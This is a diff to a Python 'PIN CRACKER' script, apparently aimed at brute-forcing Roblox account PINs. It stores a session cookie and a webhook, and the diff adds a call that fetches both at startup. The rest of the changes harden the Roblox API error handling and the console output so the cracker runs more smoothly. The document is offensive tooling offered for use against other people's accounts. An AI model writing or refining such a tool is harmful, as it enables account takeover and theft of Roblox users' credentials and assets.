@@ -1,6 +1,5 @@
 import subprocess
 import requests
-import base64
 import json
 import time
 import os
@@ -36,6 +35,7 @@ class Crack:
         self.cookie = None
         self.webhook = None
         self.continueProgress = None
+        self.check()  # Call check to get cookie and webhook
         self.start()
 
     def diagnose(self, error):
@@ -56,9 +56,9 @@ class Crack:
 
             if check.status_code == 503:
                 uiprint("Error found. Roblox is under maintenance", "error")
-            elif response['errors'][0]['message'] == 'Authorization has been denied for this request.':
+            elif response.get('errors') and response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                 uiprint("Error found. Invalid Cookie. Close the program then re-enter the cookie and try again", "error")
-            elif response['errors'][0]['message'] == 'Token Validation Failed':
+            elif response.get('errors') and response['errors'][0]['message'] == 'Token Validation Failed':
                 uiprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the Roblox API endpoint.", "error")
             elif check.status_code == 404:
                 uiprint("Error found. Roblox's API endpoint may have changed", "error")
@@ -116,11 +116,11 @@ class Crack:
         self.continueProgress = continueProgress
 
     def start(self):
-        uiprint = self.print
-        print('\n\u001B[35m█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\u001B[37m\n================================================\n\t\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN\t\u001B[37m \n================================================')
+        self.clear()
+        print('\u001B[35m█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\u001B[37m\n================================================\n\t\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN\t\u001B[37m \n================================================')
 
         time.sleep(1)
-        os.system("clear")
+        self.clear()
 
         print('''[CRACKER STARTED]''')
 
@@ -175,6 +175,7 @@ class Crack:
         print(f"Cracking process completed in {end_time - start_time:.2f} seconds.")
         print("\u001B[32m[CRACKER FINISHED]\u001B[37m")
 
+# --({ Start program }) -- #
 if __name__ == "__main__":
     try:
         Crack()
